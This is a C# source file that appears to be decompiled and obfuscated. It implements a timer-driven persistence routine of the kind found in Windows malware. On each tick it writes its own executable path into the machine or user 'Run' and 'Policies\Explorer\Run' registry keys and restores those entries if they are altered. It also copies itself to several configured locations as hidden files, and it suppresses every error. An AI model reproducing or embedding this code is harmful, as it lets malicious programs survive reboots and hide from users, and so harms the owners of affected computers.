using System.Diagnostics;
using System.IO;
using System.Timers;
using Microsoft.Win32;

internal class Class11
{
	private Timer timer_0;

	private RegistryKey registryKey_0;

	private string string_0;

	public void method_0()
	{
		timer_0.Interval = Class1.class2_0.int_1 * 1000;
		timer_0.Elapsed += timer_0_Elapsed;
		timer_0.Start();
	}

	public void method_1()
	{
		timer_0.Stop();
		timer_0.Dispose();
	}

	private void timer_0_Elapsed(object sender, ElapsedEventArgs e)
	{
		if (Class1.class2_0.bool_16)
		{
			try
			{
				registryKey_0 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				if (registryKey_0.Equals(Class1.class2_0.string_1[0]))
				{
					if (registryKey_0.GetValue(Class1.class2_0.string_1[0])!.ToString() != '"' + Class1.class2_0.string_2[0] + '"')
					{
						registryKey_0.SetValue(Class1.class2_0.string_1[0], '"' + Class1.class2_0.string_2[0] + '"');
					}
				}
				else
				{
					registryKey_0.SetValue(Class1.class2_0.string_1[0], '"' + Class1.class2_0.string_2[0] + '"');
				}
			}
			catch
			{
			}
			try
			{
				registryKey_0 = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true);
				if (registryKey_0.Equals(Class1.class2_0.string_1[1]))
				{
					if (registryKey_0.GetValue(Class1.class2_0.string_1[1])!.ToString() != '"' + Class1.class2_0.string_2[1] + '"')
					{
						registryKey_0.SetValue(Class1.class2_0.string_1[1], '"' + Class1.class2_0.string_2[1] + '"');
					}
				}
				else
				{
					registryKey_0.SetValue(Class1.class2_0.string_1[1], '"' + Class1.class2_0.string_2[1] + '"');
				}
			}
			catch
			{
			}
		}
		else
		{
			try
			{
				registryKey_0 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				if (registryKey_0.Equals(Class1.class2_0.string_1[0]))
				{
					if (registryKey_0.GetValue(Class1.class2_0.string_1[0])!.ToString() != '"' + Class1.class2_0.string_2[0] + '"')
					{
						registryKey_0.SetValue(Class1.class2_0.string_1[0], '"' + Class1.class2_0.string_2[0] + '"');
					}
				}
				else
				{
					registryKey_0.SetValue(Class1.class2_0.string_1[0], '"' + Class1.class2_0.string_2[0] + '"');
				}
			}
			catch
			{
			}
			try
			{
				registryKey_0 = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run", writable: true);
				if (registryKey_0.Equals(Class1.class2_0.string_1[1]))
				{
					if (registryKey_0.GetValue(Class1.class2_0.string_1[1])!.ToString() != '"' + Class1.class2_0.string_2[1] + '"')
					{
						registryKey_0.SetValue(Class1.class2_0.string_1[1], '"' + Class1.class2_0.string_2[1] + '"');
					}
				}
				else
				{
					registryKey_0.SetValue(Class1.class2_0.string_1[1], '"' + Class1.class2_0.string_2[1] + '"');
				}
			}
			catch
			{
			}
		}
		try
		{
			string[] string_ = Class1.class2_0.string_2;
			foreach (string text in string_)
			{
				if (!Class1.class4_0.method_5(text))
				{
					File.Copy(string_0, text);
					File.SetAttributes(text, FileAttributes.Hidden);
				}
			}
		}
		catch
		{
		}
	}

	public Class11()
	{
		Class51.smethod_0();
		timer_0 = new Timer();
		string_0 = Process.GetCurrentProcess().MainModule!.FileName;
		base._002Ector();
	}
}
